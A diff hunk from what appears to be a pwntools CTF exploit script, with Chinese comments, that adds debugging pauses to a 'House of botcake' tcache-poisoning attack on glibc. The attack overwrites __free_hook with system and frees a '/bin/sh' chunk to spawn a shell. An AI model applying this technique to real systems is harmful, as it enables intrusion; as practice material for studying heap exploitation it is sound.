@@ -52,9 +52,13 @@ gdb.attach(r)
 pause()
 #House of botcake （glibc > 2.25 且 UAF）
 delete(7) #将chunk7进入unsorted bin中 与8合并 与8合并但是7开头（后来后开头？）
+pause()
 add(10,0x80,b'0') #将tcache bin中腾出空间
+pause()
 delete(8) #将chunk8 加入tcache中
+pause()
 add(11,0xff,b'\x00'*0x80+p64(0)+p64(0x91)+p64(libc.sym['__free_hook'])+b'\x00'*7) #写入到Tcache next中 通过 x /20gx addr + 大小来查看推算
+pause()
 add(12,0x80,b'/bin/sh\x00')#将tcache中下一个变为free hook
 add(13,0x80,p64(system_addr))#写free_hook
 delete(12)
